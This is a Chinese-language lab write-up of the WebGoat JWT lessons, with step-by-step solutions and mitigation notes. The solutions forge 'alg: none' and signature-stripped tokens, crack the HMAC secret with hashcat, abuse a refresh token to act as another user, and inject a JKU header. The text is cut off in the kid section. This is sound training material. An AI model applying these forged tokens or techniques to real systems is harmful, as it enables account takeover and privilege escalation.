---
id: 
title: JWT tokens
---
<!-- muse start -->
Web Goat 对 JWT 的介绍，尚可，补足 portswigger 的内容。
portswigger 的 kid 注入为目录遍历，Web Goat 为 SQL 注入。
<!-- muse end -->

## 1. 概念

本课程讲解如何使用 JSON Web 令牌（JWT）进行身份验证，以及使用 JWT 时需要注意的常见陷阱。

### 目标

教授如何安全地实现令牌的使用和验证。

### 引言

许多应用程序使用 JSON Web 令牌（JWT）让客户端在身份验证后能够表明其身份以进行后续交互。

摘自 https://jwt.io/introduction：

> JSON Web 令牌（JWT）是一种开放标准（RFC 7519），它定义了一种紧凑且自包含的方式，用于在各方之间作为 JSON 对象安全地传输信息。由于这些信息是经过数字签名的，因此可以被验证和信任。JWT 可以使用密钥（通过 HMAC 算法）或使用 RSA 的公私钥对进行签名。
> 
> JSON Web 令牌用于携带与客户端身份和特征（声明）相关的信息。该“容器”由服务器签名，以防止客户端篡改其内容（例如更改身份或任何特征，如将角色从普通用户更改为管理员，或更改客户端登录信息）。此令牌在身份验证期间创建（在成功验证时提供），并在任何处理之前由服务器进行验证。应用程序通过该令牌允许客户端向服务器出示代表其“身份证”（包含所有用户信息的容器）的令牌，并使服务器能够以安全的方式验证令牌的有效性和完整性，所有这一切均采用无状态且可移植的方法（可移植性体现在客户端和服务器技术可以不同，包括传输通道，即使最常用的是 HTTP）。

## 2. JWT 令牌结构

让我们来看一下 JWT 令牌的结构：

[JWT](./images/jwt_token.png)
*Web Goat: jwt_token.png*

该令牌经过 Base64 编码，由三部分组成：

- **头部**
- **声明**
- **签名**

头部和声明均由 JSON 对象表示。头部描述了应用于 JWT 的加密操作以及 JWT 的可选附加属性。声明则表示一个 JSON 对象，其成员是由 JWT 承载的声明信息。

## 3. JWT 声明滥用

JWT 声明滥用是指对 JSON Web 令牌（JWT）中的声明进行不当或未经授权的操纵。JWT 是一种紧凑且自包含的方式，用于在双方之间表示信息。它由头部、有效载荷（声明）和签名组成。

JWT 声明滥用可能以不同方式发生：

**未经授权的声明**：恶意用户可能尝试向 JWT 添加未经授权的声明，以获取其无权访问的特定功能或资源。例如，普通用户尝试修改其 JWT 以声明管理员权限。

**声明篡改**：攻击者可能尝试修改 JWT 中现有声明的值，以操纵其自身身份或更改其权限。例如，更改 "user_id" 声明以冒充其他用户。

**过度声明**：攻击者可能尝试在 JWT 中包含大量不必要或虚假的声明，以增加令牌大小，可能破坏系统性能或引发其他问题。

**过期或被篡改的过期声明**：如果攻击者能够修改 "exp" 声明以延长令牌的过期时间，他们可以有效地在预定会话时间之外获得访问权限。

**重放攻击**：攻击者可能尝试重用旧会话中的有效 JWT 来冒充原始用户或利用有时限的功能。

**关键声明操纵**：在某些情况下，"kid"（密钥 ID）声明可能被滥用，如先前答案中所述。攻击者可能尝试操纵 "kid" 声明以使用不同的密钥进行签名验证。

为防止 JWT 声明滥用，必须在客户端和服务器端实施适当的验证机制。验证声明以确保其有效、授权且与用户上下文相关。此外，始终验证 JWT 的签名以确保令牌的完整性并防止篡改。遵循 JWT 实施、安全密钥管理和定期密钥轮换的最佳实践也将有助于降低 JWT 声明滥用的风险。

在以下两个部分中，我们将深入探讨一些头部声明滥用的示例，以便您了解其工作原理以及如何保护应用程序。

## 4. 解码 JWT 令牌

让我们尝试解码一个 JWT 令牌，为此您可以使用 WebWolf 内的 JWT 功能。给定以下令牌：

```text
eyJhbGciOiJIUzI1NiJ9.ew0KICAiYXV0aG9yaXRpZXMiIDogWyAiUk9MRV9BRE1JTiIsICJST0xFX1VTRVIiIF0sDQogICJjbGllbnRfaWQiIDogIm15LWNsaWVudC13aXRoLXNlY3JldCIsDQogICJleHAiIDogMTYwNzA5OTYwOCwNCiAgImp0aSIgOiAiOWJjOTJhNDQtMGIxYS00YzVlLWJlNzAtZGE1MjA3NWI5YTg0IiwNCiAgInNjb3BlIiA6IFsgInJlYWQiLCAid3JpdGUiIF0sDQogICJ1c2VyX25hbWUiIDogInVzZXIiDQp9.9lYaULTuoIDJ86-zKDSntJQyHPpJ2mZAbnWRfel99iI
```

复制并粘贴以下令牌并解码该令牌，您能在令牌中找到用户吗？

在 Web Wolf 中解码 JWT 得到
```json
{
  "alg" : "HS256"
}
{
  "authorities" : [ "ROLE_ADMIN", "ROLE_USER" ],
  "client_id" : "my-client-with-secret",
  "exp" : 1607099608,
  "jti" : "9bc92a44-0b1a-4c5e-be70-da52075b9a84",
  "scope" : [ "read", "write" ],
  "user_name" : "user"
}
```

## 5. 认证与获取 JWT 令牌

获取令牌的基本流程如下：

![jwt_diagram.png](./images/jwt_diagram.png)
*Web Goat: JWT 流程图*

在此流程中，用户使用用户名和密码登录，服务器在成功验证后返回响应。服务器创建新令牌并将其返回给客户端。当客户端向服务器发起连续调用时，会在 "Authorization" 请求头中附加新令牌。服务器读取令牌并首先验证签名，成功验证后服务器使用令牌中的信息识别用户身份。

### 声明

令牌包含用于识别用户以及服务器处理请求所需的所有其他信息的声明。请注意不要在令牌中存储敏感信息，并始终通过安全通道传输令牌。

## 6. JWT 签名

每个 JWT 令牌在发送给客户端之前至少应进行签名。如果令牌未签名，客户端应用程序将能够更改令牌内容。签名规范定义参见[此处](https://tools.ietf.org/html/rfc7515)，可使用的具体算法描述参见[此处](https://tools.ietf.org/html/rfc7518)。本质上，您需要使用 **基于 SHA-2 函数的 HMAC** 或 **使用 RSASSA-PKCS1-v1_5/ECDSA/RSASSA-PSS 的数字签名** 功能对令牌进行签名。

### 验证签名

在执行任何其他操作之前，一个重要步骤是验证签名。让我们探讨验证令牌前需要注意的一些事项。

### 实践任务

尝试修改您收到的令牌，通过更改令牌内容获得管理员权限。在成为管理员后，请重置投票数据。

查看拦截代理服务器，此时未收到任何令牌，任务区显示当前用户为`Guest`且无法投票。

点击用户功能可切换到其他用户，此处选择 `Tom`，任务区显示内容更新，查看请求

```http
GET /WebGoat/JWT/votings/login?user=Tom HTTP/1.1
```
响应设置了 JWT
```http
Set-Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NjgzNzM4MDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rXFwzRJ-v6JKUfi3osrJYZHMt-jk2emFRlXHrr8YMMJVTqSHacT-8XuanNOdn_mSeCSv3FY8YbV2ounikrJxlg
```
解码得到
```json
{
  "admin" : "false",
  "iat" : 1768373804,
  "user" : "Tom"
}
```
修改字段为 `"admin" : "true"` 后保存 JWT（Web Wolf 缺乏无签名时最后的`.`）
`eyJhbGciOiJIUzUxMiJ9.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE3NjgzNzM4MDQsDQogICJ1c2VyIiA6ICJUb20iDQp9.`

重置投票数据的功能的请求为
```http
POST /WebGoat/JWT/votings HTTP/1.1
Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NjgzNzQwNzEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.a1GtLvDzMt5zzzopptuZFQwJ0M_GSFizIbvifgGwI0CRkYBHQne4-muyq1qgZYekWMKNdgBXb3DRXQwmAjGJgw
```

修改此 JWT 为之前篡改的 JWT
```http
POST /WebGoat/JWT/votings HTTP/1.1
Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE3NjgzNzM4MDQsDQogICJ1c2VyIiA6ICJUb20iDQp9.
```
通过挑战，此处应用程序未验证签名与头部，甚至无需`none`签名
实际上，完全移除头部仍能够通过挑战
`Cookie: access_token=.eyJpYXQiOjE3NjgzNzQwNzEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.`

## 7. 解决方案

此项实践任务的设计思路是，您可以通过操纵令牌，可能导致服务器以不同方式解析令牌。早期JWT库出现时，它们严格按规范实现，意味着库会根据头部指定的算法进行工作。

> 经过签名的JSON Web令牌在头部参数"alg"中明确指示了签名算法，以促进密码敏捷性。这一点，结合某些库和应用程序中的设计缺陷，导致了多种攻击：
> 
> - 攻击者可将算法更改为"none"，而某些库会信任此值，并在不检查任何签名的情况下"验证"JWT。
> - "RS256"（RSA，2048位）参数值可被更改为"HS256"（HMAC，SHA-256），某些库会尝试使用HMAC-SHA256以及RSA公钥作为HMAC共享密钥来验证签名（参见[McLean]和[CVE-2015-9235]）。
> 
> 缓解措施请参见第3.1和3.2节。
> 
*— https://tools.ietf.org/html/rfc8725#section-2.1*

本质上，当时的情况是这些库只是按接收到的原样解析令牌，而没有验证令牌创建时使用了何种密码学操作。

### 解决步骤

首先请注意，我们是以`Guest`身份登录的，因此首先选择另一个用户，例如：Tom。用户Tom被允许投票，但无法重置投票数据。查看请求，响应中将返回一个`access_token`：

```http
GET http://localhost:8080/WebGoat/JWT/votings/login?user=Tom HTTP/1.1

access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA
```

解码该令牌得到：

```json
{
  "alg": "HS512"
}
{
  "iat": 1608128566,
  "admin": "false",
  "user": "Tom"
}
```

我们可以将admin声明改为true，但这样签名就会失效。我们如何获得一个有效的签名呢？查阅[RFC规范](https://tools.ietf.org/html/rfc7519#section-6.1)，`alg: none` 是一个有效的选项，它会产生一个不安全的JWT。让我们修改令牌：


```json
{
  "alg": "none"
}
{
  "iat": 1608128566,
  "admin": "true",
  "user": "Tom"
}
```

如果我们使用WebWolf创建令牌，将得到：

```
eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9
```

现在我们可以替换Cookie中的令牌，并再次执行重置操作。需要注意的一点是，需要在末尾添加一个`.`，否则令牌无效。

## 8. 代码审查

现在让我们进行代码审查，并尝试思考使用 `alg: none` 的攻击方式。我们使用以下令牌：

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.
```

解码后得到：
```json
{
  "alg" : "none",
  "typ" : "JWT"
},
{
  "admin" : true,
  "iat" : 1516239022,
  "sub" : "1234567890",
  "user" : "John Doe"
}
```

```java
try {
//   创建 JWT解析器，设置密钥，并进行验证
   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);
   Claims claims = (Claims) jwt.getBody();
   String user = (String) claims.get("user");
   boolean isAdmin = Boolean.valueOf((String) claims.get("admin"));
   if (isAdmin) {
     removeAllUsers();
   } else {
     log.error("You are not an admin user");
   }
} catch (JwtException e) {
  throw new InvalidTokenException(e);
}
```

```java
try {
//   创建 JWT解析器，设置密钥，直接解析而无验证
   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
   Claims claims = (Claims) jwt.getBody();
   String user = (String) claims.get("user");
   boolean isAdmin = Boolean.valueOf((String) claims.get("admin"));
   if (isAdmin) {
     removeAllUsers();
   } else {
     log.error("You are not an admin user");
   }
} catch (JwtException e) {
  throw new InvalidTokenException(e);
}
```

代码片段1验证失败而抛出异常，代码片段2无验证而进入管理员代码路径

## 9. 代码审查（2）

与之前情况相同，但这次我们仅移除签名部分，保持算法不变。
```text
eyJhbGciOiJIUzI1NiJ9.ew0KICAiYWRtaW4iIDogdHJ1ZSwNCiAgImlhdCIgOiAxNTE2MjM5MDIyLA0KICAic3ViIiA6ICIxMjM0NTY3ODkwIiwNCiAgInVzZXIiIDogIkpvaG4gRG9lIg0KfQ.
```

对应结构：
```json
{
  "alg" : "HS256"
},
{
  "admin" : true,
  "iat" : 1516239022,
  "sub" : "1234567890",
  "user" : "John Doe"
}
```
使用以下解析方法，我们仍然能够跳过签名检查。

```java
try {
   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
   Claims claims = (Claims) jwt.getBody();
   String user = (String) claims.get("user");
   boolean isAdmin = Boolean.valueOf((String) claims.get("admin"));
   if (isAdmin) {
     removeAllUsers();
   } else {
     log.error("You are not an admin user");
   }
} catch (JwtException e) {
  throw new InvalidTokenException(e);
}
```

## 10. 解决方案

在之前的实践任务中，我们认识到不能完全依赖库来自动执行正确的操作。在两种案例中我们发现，即使明确指定了JWT密钥并传递了正确的算法，问题依然存在。即使使用以下令牌：

```text
eyJhbGciOiJIUzI1NiJ9.ew0KICAiYWRtaW4iIDogdHJ1ZSwNCiAgImlhdCIgOiAxNTE2MjM5MDIyLA0KICAic3ViIiA6ICIxMjM0NTY3ODkwIiwNCiAgInVzZXIiIDogIkpvaG4gRG9lIg0KfQ.
```
对应结构：
```json
{
  "alg" : "HS256"
},
{
  "admin" : true,
  "iat" : 1516239022,
  "sub" : "1234567890",
  "user" : "John Doe"
}
```
以及以下Java代码：
```java
Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
```

可见，虽然我们通过`setSigningKey`方法设置了签名密钥，但库仍然跳过了签名的验证。
这不仅限于传统的`alg: none`攻击，对`alg: HS256`同样有效。

### 结论

当选择库来处理JWT令牌时，请确保：
1.  在验证令牌的代码中使用正确的方法。
2.  添加测试用例，验证算法混淆攻击是否被有效防范。
3.  作为安全团队，编写封装了该库的工具方法供开发团队使用，以确保他们采用正确的解析逻辑。

### 替代方案：PASETO

算法混淆是处理JWT时的一个现实问题。可以通过使用PASETO（平台无关安全令牌）来避免，该标准目前已在10种编程语言中实现。使用此方法的一个缺点是JWT应用非常广泛（例如OAuth），因此更换可能并非最佳解决方案。

## 11. JWT 破解

使用基于 SHA-2 函数的 HMAC 时，您需要使用一个密钥对令牌进行签名和验证。一旦我们获知此密钥，就可以创建新令牌并对其进行签名。因此，密钥的强度至关重要，必须足够强，使得暴力破解或字典攻击不可行。在获取令牌后，攻击者可以发起离线暴力破解或字典攻击。

### 实践任务

假设我们拥有以下令牌，请尝试找出其密钥，并提交一个将用户名更改为 `WebGoat` 的新密钥。

`eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc2NzUxMDA2NywiZXhwIjoxNzY3NTEwMTI3LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.KFZfWBmwT8YM6w_e6l3nGiJq9CgEWI1prrHgSYKxQ6Q`

回想 portswigger 的 JWT 主题中的[爆破小节](https://portswigger.net/web-security/jwt#brute-forcing-secret-keys)

爆破弱秘密：
- 方法1
    使用 Burp 的 JWT Editor 插件中 `attack - Weak MAC secret`
    爆破结果为 `available`
- 方法2
    安装 hashcat
    ```bash
    $ sudo apt-get update && sudo apt-get install hashcat
    ```

    下载爆破词典
    <https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list>

    使用词典对 JWT 进行爆破
    ```bash
    hashcat -a 0 -m 16500 <jwt> <wordlist>
    ```


使用 Web Wolf 或插件，将秘密 `available` 粘贴到对应框内/新建对称密钥。
修改已经过期的时间，签名后提交有效。
修改用户名 `Tom` 到目标 `WebGoat`，签名后提交通过挑战。
（Web Wolf 需在修改后点击输入框外的其他位置应用修改）
    

## 12. 令牌刷新

### 引言

在本节中，我们将探讨访问令牌的刷新机制。

### 令牌类型

通常存在两种类型的令牌：访问令牌和刷新令牌。访问令牌用于向服务器发起 API 调用。访问令牌具有有限的生命周期，这正是刷新令牌的用武之地。一旦访问令牌失效，可以通过向服务器出示刷新令牌来请求一个新的访问令牌。刷新令牌也可能过期，但其生命周期要长得多。这解决了用户必须重新使用其凭据进行身份验证的问题。是否应该使用刷新令牌和访问令牌取决于具体情况，以下是在选择使用哪种令牌时需注意的几点考量。

因此，一个典型的流程可能如下所示：

```bash
curl -X POST -H -d 'username=webgoat&password=webgoat' localhost:8080/WebGoat/login
```

服务器返回：

```json
{
    "token_type": "bearer",
    "access_token": "XXXX.YYYY.ZZZZ",
    "expires_in": 10,
    "refresh_token": "4a9a0b1eac1a34201b3c5659944e8b7"
}
```

如您所见，刷新令牌是一个随机字符串，服务器可以对其进行跟踪（在内存中或存储在数据库中），以便将刷新令牌与授予该令牌的用户匹配起来。因此，在这种情况下，只要访问令牌仍然有效，我们就可以称之为“无状态”会话，服务器端无需承担建立用户会话的负担，令牌是自包含的。当访问令牌失效时，服务器需要查询存储的刷新令牌，以确保该令牌未被以任何方式阻止。
如果攻击者获取了访问令牌，该令牌也仅在特定时间段内（例如10分钟）有效。攻击者随后需要刷新令牌才能获得新的访问令牌。这就是为什么刷新令牌需要更好的保护。也可以将刷新令牌设计为无状态的，但这意味着将更难判断用户是否已撤销令牌。服务器完成所有验证后，必须向客户端返回一个新的刷新令牌和一个新的访问令牌。客户端可以使用新的访问令牌来发起 API 调用。

### 需要检查哪些内容？

无论选择哪种解决方案，您都应在服务器端存储足够的信息以验证用户是否仍受信任。可以考虑的方面包括：存储IP地址、跟踪刷新令牌的使用次数（在访问令牌的有效时间窗口内多次使用刷新令牌可能表明异常行为，此时可撤销所有令牌并让用户重新认证）。同时还需记录哪个访问令牌属于哪个刷新令牌，否则攻击者可能利用自己的刷新令牌为其他用户获取新的访问令牌（有关此攻击原理的详细说明可参阅：https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation）。此外，检查用户的IP地址或地理位置也是重要措施。如需签发新令牌，应验证用户地理位置是否一致，若不一致则撤销所有令牌并要求重新认证。

### 刷新令牌的必要性

在现代单页应用程序（SPA）中使用刷新令牌是否合理？如令牌存储章节所述，存储方式有两种：Web存储或Cookie。这意味着刷新令牌与访问令牌往往并存，因此若访问令牌泄露，刷新令牌很可能同时被盗。当然，大多数场景下两者存在差异：访问令牌在发起API调用时发送，而刷新令牌仅在获取新访问令牌时发送（通常指向不同端点）。如果最终指向同一服务器，也可选择仅使用访问令牌。

如前所述，使用访问令牌和独立的刷新令牌能为服务器提供一定灵活性，避免重复验证访问令牌，仅需在用户申请新访问令牌时执行检查。仅使用访问令牌的方案确实可行，此时服务器需存储与刷新令牌验证相同的信息（参见前文）。这种方式虽需每次验证令牌，但可能适用于特定应用场景。若选择存储刷新令牌进行验证，则必须对这些令牌实施保护（至少使用哈希函数存储至数据库）。

### JWT是否是最佳选择？

现有大量资源对使用JWT令牌进行客户端到服务器认证（相较于Cookie方案）的适用性提出质疑。JWT令牌的最佳应用场景是服务器间通信。对于常规Web应用程序，使用传统Cookie方案往往更优。更多信息可参考：
- [停止使用JWT管理会话](http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/)
- [停止使用JWT管理会话（第二部分）：为何您的方案无效](http://cryto.net/~joepie91/blog/2016/06/19/stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work/)
- ![流程图解](http://cryto.net/~joepie91/blog/attachments/jwt-flowchart.png)

## 13. 令牌刷新

实施良好的访问令牌刷新策略至关重要。本实践任务基于 Bugcrowd 私有漏洞赏金项目中发现的漏洞，您可在[此处](https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/)阅读完整报告。
即，使用攻击者的刷新令牌对其他用户的过期令牌进行刷新，应用程序并未关联刷新令牌与用户信息。

### 实践任务

根据去年的一次数据泄露事件，可在[此处](http://localhost:3000/WebGoat/images/logs.txt)获取以下日志文件。您能否找到一种方法来订购书籍，但让 Tom 为此付款？

`logs.txt` 文件内容：
```log
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/checkout?token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q HTTP/1.1" 401 242 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
```
从中提取出服务器签名的有效但过期的 Tom 的 JWT
`eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q`

请求历史记录中服务器响应的令牌：
```json
{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w",
  "refresh_token" : "FOVUlSosUNdMdKcXOINt"
}
```

结账的请求为
```http
POST /WebGoat/JWT/refresh/checkout HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
```
此处使用 `none` 签名 JWT 头部仍有效

使用 Tom 的陈旧的令牌或攻击者自己的令牌（修改名称），修改或删除时间字段后签名再提交，响应为：
`Nicely found! You solved the assignment with 'alg: none' can you also solve it by using the refresh token?`

尝试向令牌刷新端点提交 Tom 的 JWT 头部与攻击者的刷新令牌
点击提示，得到刷新端点的提示信息（但之后仍无法找到此端点）
`The endpoint for refreshing a token is 'JWT/refresh/newToken'`

刷新令牌的消息：
```http
POST /WebGoat/JWT/refresh/newToken HTTP/1.1
Authorization: Bearer Tom的过期JWT
Content-Type: application/json;charset=UTF-8

{
    "refresh_token" : "攻击者的刷新令牌"
}
```
响应得到 Tom 的新令牌（只是移除了时间字段），修改结账的 JWT 头部为此令牌后通过挑战

## 14. JWT 声明滥用

JWT 声明滥用是指对 JSON Web 令牌（JWT）中的声明进行不当或未经授权的操纵。JWT 是一种在双方之间表示信息的紧凑且自包含的方式，由头部、有效载荷（声明）和签名三部分组成。

JWT 声明滥用可能通过以下几种方式发生：

*   **未经授权的声明**：恶意用户可能尝试向 JWT 添加未经授权的声明，以获取其无权访问的特定功能或资源。例如，普通用户试图修改其 JWT 以声明拥有管理员权限。
*   **篡改声明**：攻击者可能尝试修改 JWT 中现有声明的值，以操纵其自身身份或更改其权限。例如，更改 "user_id" 声明以冒充其他用户。
*   **过多声明**：攻击者可能尝试在 JWT 中包含大量不必要或虚假的声明，以增加令牌大小，可能破坏系统性能或导致其他问题。
*   **过期或被篡改的过期声明**：如果攻击者能够修改 "exp" 声明以延长令牌的过期时间，他们就可以在实际会话结束后继续获得访问权限。
*   **重放攻击**：攻击者可能尝试重用旧会话中的有效 JWT，以冒充原始用户或利用有时限的功能。
*   **密钥声明操纵**：在某些情况下，"kid"（密钥 ID）声明可能被滥用，如先前解答中所述。攻击者可能尝试操纵 "kid" 声明，以使用不同的密钥进行签名验证。

为防止 JWT 声明滥用，必须在客户端和服务器端实施适当的验证机制。验证声明以确保其有效、经过授权且与用户的上下文相关。此外，始终验证 JWT 的签名，以确保令牌的完整性并防止篡改。遵循 JWT 实施、安全密钥管理和定期密钥轮换的最佳实践，也将有助于降低 JWT 声明滥用的风险。

在接下来的两个章节中，我们将深入探讨一些头部声明滥用的示例，以便您了解其工作原理以及如何保护应用程序。


## 15. 声明滥用

当头部信息被不当篡改或操纵时，可能发生头部声明滥用。

### JSON Web 密钥 URL (JKU)

JKU 是 JWT 规范的一部分，它允许 JWT 消费者动态获取验证令牌签名所需的公钥。它是一个指向 JSON Web 密钥集 (JWKS) 端点的 URL，该端点包含签发者用于签署 JWT 的公钥。

一个 JKU 示例如下所示：

```json
{
"jku": "https://example.com/.well-known/jwks.json"
}
```

### 漏洞

**利用 JKU 的 JWT 声明滥用**：当 JWT 使用弱密钥或可预测密钥签名，并且服务器提供的 JKU 指向托管公钥的外部位置时，此漏洞就会出现。

攻击者可以通过制作带有恶意声明的 JWT，并利用 `jku` 诱骗服务器使用弱密钥或被操纵的密钥来验证 JWT，从而利用此漏洞。这完全取决于应用程序内部使用的库。一些库默认会阻止从随机服务器下载，并使用允许的 URL 列表。然而，对 URL 进行过滤实现起来颇具挑战性，并且这也可能被绕过。

### 利用步骤

1.  **识别 JKU 端点**：攻击者首先需要在应用程序的 JWT 处理逻辑或任何暴露的配置中找到 JKU 端点。
2.  **生成恶意 JWT**：制作一个带有恶意声明的 JWT，通过更改或添加声明来获取未经授权的访问或提升权限。
3.  **签署 JWT**：使用自己的私钥对恶意 JWT 进行签名。
4.  **将 JWT 发送至服务器**：将带有恶意声明的 JWT 发送到服务器。
5.  **服务器验证**：服务器在收到 JWT 后，使用从 JWKS 端点获取的公钥验证签名。
6.  **攻击成功**：如果服务器使用弱密钥或被操纵的密钥来验证 JWT，攻击者将获得未经授权的访问或执行其预期的利用。

### 缓解措施

为防止利用 JKU 的 JWT 声明滥用，开发人员和安全专业人员应遵循以下最佳实践：
*   **白名单**：利用白名单来验证从令牌接收到的 JKU 是否存在于允许列表中。在比较 URL 时要小心，应使用白名单，并验证 `jku` 中的完整 URL，而不是使用字符串比较函数。
*   **静态密钥**：避免使用指向外部端点托管的公钥的 JKU。相反，应使用安全管理并定期更新的静态密钥。
*   **签名验证**：确保服务器正确验证 JWT 签名，并拒绝签名无效或被篡改的令牌。
*   **JWT 验证**：仔细验证和清理所有 JWT 声明，以防止注入攻击和未经授权的访问。
*   **审计与监控**：定期审计 JWT 使用情况，监控可疑活动，并实施异常检测机制。
*   **安全测试**：定期执行安全测试，包括渗透测试和代码审查，以识别和修复潜在漏洞。

## 16. 动手尝试...

下方您会看到两个账户，一个是 Jerry 的，另一个是 Tom 的。Jerry 想要从 Twitter 上删除 Tom 的账户，但他的令牌只能删除自己的账户。您能否尝试帮助他删除 Tom 的账户？

点击删除按钮，观察请求
```http
POST /WebGoat/JWT/jku/delete?token=eyJ0eXAiOiJKV1QiLCJqa3UiOiJodHRwczovL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL3dlYmdvYXQvLndlbGwta25vd24vandrcy5qc29uIiwiYWxnIjoiUlMyNTYifQ.ewogICJpc3MiOiAiV2ViR29hdCBUb2tlbiBCdWlsZGVyIiwKICAiaWF0IjogMTUyNDIxMDkwNCwKICAiZXhwIjogMTYxODkwNTMwNCwKICAiYXVkIjogIndlYmdvYXQub3JnIiwKICAic3ViIjogImplcnJ5QHdlYmdvYXQuY29tIiwKICAidXNlcm5hbWUiOiAiSmVycnkiLAogICJFbWFpbCI6ICJqZXJyeUB3ZWJnb2F0LmNvbSIsCiAgIlJvbGUiOiBbCiAgICAiQ2F0IgogIF0KfQ.SabvRaYSCW7xI0ueca19TL1e66cJIJaxRiydK2G5lgFMIbL5gQQjE6022HEha9HcprqFXyHbtXrQWRXAp6Gjaf5zs8LUMBMARWjEr8TS43ihguarmLLmvBCoqjiZY39o4EcEjEH9xAoyIYR_Trh7kXn6JVU-8MM76l9IOcYIJ9c8LqT1ERNmbCqtI4PP0tdqCy99nHhqlxSCVXaGDF0jMHV5kjCDSHNYib9riy9xZ63Sztify-bwPqRvxmaShPYtG4BBM_WOGlg-bYTTuws-6yISMfTB5U1WBDwLr6dLU123TGO26wCVBgTKbA0KKG94-ToOcneWLOTEacEfQQOlIQ HTTP/1.1
Host: localhost:3000
```
解码后：
```json
{
    "typ": "JWT",
    "jku": "https://cognito-idp.us-east-1.amazonaws.com/webgoat/.well-known/jwks.json",
    "alg": "RS256"
}
{
  "iss": "WebGoat Token Builder",
  "iat": 1524210904,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Jerry",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}
```

进行 JKU 头部注入：
1. 在 Burp 扩展中创建 JWK 格式的 RSA 密钥
2. 复制此密钥的必要部分到 JSON 文件中，并上传到 Web Wolf
3. 修改 JWT 头部的 JKU 地址为 Web Wolf 的文件地址
4. 修改载荷的过期时间后使用 RSA 密钥签名
- 以 `Jerry` 账户发送后提示
    `Yikes, you are removing Jerry's account, try to delete the account of Tom`
- 修改名称为 `Tom` 再签名后发送，通过挑战

JWT 头部为：
```json
{
    "typ": "JWT",
    "jku": "http://127.0.0.1:9090/WebWolf/files/apkallus/jwks.json",
    "alg": "RS256"
}
```

创建 RSA 密钥后仅保留3个必要字段到公钥文件
```json
{
    "keys": [{
        "kty": "密钥类型",
        "e": "公钥指数",
        "n": "模数"
    }]
}
```

## 17. 声明滥用

接下来，我们将探讨滥用 JSON Web 令牌 (JWT) 中密钥 ID (kid) 声明的安全隐患。

## JSON 密钥 ID (kid)

密钥 ID (kid) 指示应使用 JSON Web 密钥集 (JWKS) 中的哪个密钥来验证 JWT 的签名。当被滥用时，攻击者可利用此漏洞获取对敏感资源的未授权访问或执行权限提升。

一个 KID 示例如下所示：
```json
{
  "alg": "RS256",
